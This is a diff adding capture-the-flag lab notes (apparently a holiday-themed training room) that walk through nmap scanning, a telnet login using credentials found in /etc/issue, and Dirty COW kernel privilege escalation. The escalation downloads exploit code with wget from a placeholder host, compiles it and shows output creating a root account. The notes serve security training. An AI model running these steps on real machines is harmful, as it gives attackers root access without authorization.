@@ -217,3 +217,80 @@ smbclient //10.10.178.30/tbfc-hr
 * metasploit
   * search for CVE
   * set targeturi to /cgi-bin/[thescriptname]
+
+# Task 15 - Day 13 - Networking
+Challenge Task
+
+* Enumeration - nmap
+```
+nmap -A -T4 10.10.103.38 | tee nmap.txt
+```
+* Initial access - telnet
+```
+telnet 10.10.103.38
+```
+* Enumeration - system
+```
+$ pwd
+/home/santa
+$ whoami
+santa
+$ sudo -l
+[sudo] password for santa: 
+Sorry, user santa may not run sudo on christmas.
+$ cat /etc/*release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=12.04
+DISTRIB_CODENAME=precise
+DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
+$ uname -a
+Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+$ cat /etc/issue
+HI SANTA!!! 
+
+We knew you were coming and we wanted to make
+it easy to drop off presents, so we created
+an account for you to use.
+
+Username: santa
+Password: clauschristmas
+
+We left you cookies and milk!
+```
+* Exploiting dirtycow
+  * https://dirtycow.ninja/
+```
+wget http://a.b.c.d/dirty.c
+--2021-05-08 17:51:49--  http://a.b.c.d/dirty.c
+Connecting to a.b.c.d:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2826 (2.8K) [text/x-csrc]
+
+gcc -pthread dirty.c -o dirty -lcrypt
+
+$ ./dirty                                                                                                                                            
+/etc/passwd successfully backed up to /tmp/passwd.bak                                                                                                
+Please enter the new password:                                                                                                                       
+Complete line:                                                                                                                                       
+firefart:fiLU3qfsE1tyU:0:0:pwned:/root:/bin/bash                                                                                                     
+                                                                                                                                                     
+mmap: 7f38dfd30000                                                                                                                                   
+madvise 0                                                                                                                                            
+                                                                                                                                                     
+ptrace 0                                                                                                                                             
+Done! Check /etc/passwd to see if the new user was created.                                                                                          
+You can log in with the username 'firefart' and the password 'blank'.                                                                                
+                                                                                                                                                     
+                                                                                                                                                     
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd                                                                                            
+Done! Check /etc/passwd to see if the new user was created.                                                                                          
+You can log in with the username 'firefart' and the password 'blank'.                                                                                
+                                                                                                                                                     
+                                                                                                                                                     
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd                                                                                            
+$                                                                                                                                                    
+$ su firefart                                                                                                                                        
+Password:                                                                                                                                            
+firefart@christmas:/home/santa# whoami                                                                                                               
+firefart                                           
+```
